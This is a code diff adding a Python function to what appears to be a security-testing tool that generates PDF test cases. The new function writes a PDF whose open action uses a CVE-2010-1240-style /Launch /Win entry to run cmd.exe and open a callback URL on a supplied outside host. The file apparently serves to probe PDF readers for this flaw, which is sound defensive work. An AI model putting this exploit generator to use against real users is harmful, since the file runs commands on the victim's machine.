@@ -241,6 +241,23 @@ startxref
 ''')
 
 
+
+def write_launch_win_cve(filename, host):
+    """CVE-2010-1240 class — /Launch /Win opens cmd to start the callback URL."""
+    param = "/c start " + host.rstrip("/") + "/cve-2010-1240-launch"
+    with open(filename, "w") as file:
+        file.write(
+            "%PDF-1.7\n\n"
+            "1 0 obj\n  << /Type /Catalog\n     /Pages 2 0 R\n     /OpenAction 5 0 R\n  >>\nendobj\n\n"
+            "2 0 obj\n  << /Type /Pages\n     /Kids [3 0 R]\n     /Count 1\n     /MediaBox [0 0 595 842]\n  >>\nendobj\n\n"
+            "3 0 obj\n  << /Type /Page\n     /Parent 2 0 R\n     /Resources\n      << /Font\n          << /F1\n              << /Type /Font\n                 /Subtype /Type1\n                 /BaseFont /Courier\n              >>\n          >>\n      >>\n     /Contents [4 0 R]\n  >>\nendobj\n\n"
+            "4 0 obj\n  << /Length 67 >>\nstream\n  BT\n    /F1 22 Tf\n    30 800 Td\n    (Testcase: 'launch-win'  ) Tj\n  ET\nendstream\nendobj\n\n"
+            "5 0 obj\n  << /Type /Action\n     /S /Launch\n     /Win << /F (cmd.exe) /P (" + param + ") >>\n  >>\nendobj\n\n"
+            "xref\n0 6\n0000000000 65535 f \n0000000010 00000 n \n0000000069 00000 n \n0000000170 00000 n \n0000000460 00000 n \n0000000580 00000 n \n"
+            "trailer\n  << /Root 1 0 R\n     /Size 6\n  >>\nstartxref\n900\n%%EOF\n"
+        )
+
+
 def write_gotor_remote(filename, host):
     with open(filename, "w") as file:
         file.write('''%PDF-1.7
